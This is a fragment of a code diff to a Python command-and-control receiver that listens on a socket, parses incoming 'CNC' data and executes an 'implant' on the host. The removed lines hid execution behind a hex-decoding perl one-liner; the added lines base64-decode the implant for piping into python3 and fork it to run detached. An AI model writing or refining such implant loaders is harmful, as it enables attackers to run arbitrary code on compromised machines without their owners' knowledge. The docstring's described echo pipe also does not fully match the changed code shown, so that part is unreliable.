@@ -12,14 +12,14 @@ def accept_connection():
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.bind((HOST, PORT))
-    sock.listen(1)
+    sock.listen(10)
     conn, addr = sock.accept()
 
     data = b""
     while True:
-        data_in = conn.recv(1024)
+        data_in = conn.recv(2048)
         data += data_in
-        if len(data_in) < 1024:
+        if len(data_in) == 0:
             break
     sock.close()
 
@@ -53,17 +53,13 @@ def parse_cnc(data):
 def execute_cnc(implant):
     """Execute the implant on the server
 
-    The implant is hex encoded python code.  This function decodes the implant and executes it
-    using perl to execute python3.
+    The implant is base64 encoded python code that is wrapped with an echo call
+    that pipes it directly into python 3, as below:
+
+    echo " + command + " | python3
     """
 
-    command = (
-        "perl -e 'system(pack(qq,H"
-        + str(len(implant))
-        + ",,qq,"
-        + implant
-        + ",))'"
-    )
+    command = b64decode(implant).decode('utf-8')
 
     # Fork the process and execute the implant.  Allows the implant to run
     # without the reveiver also running.
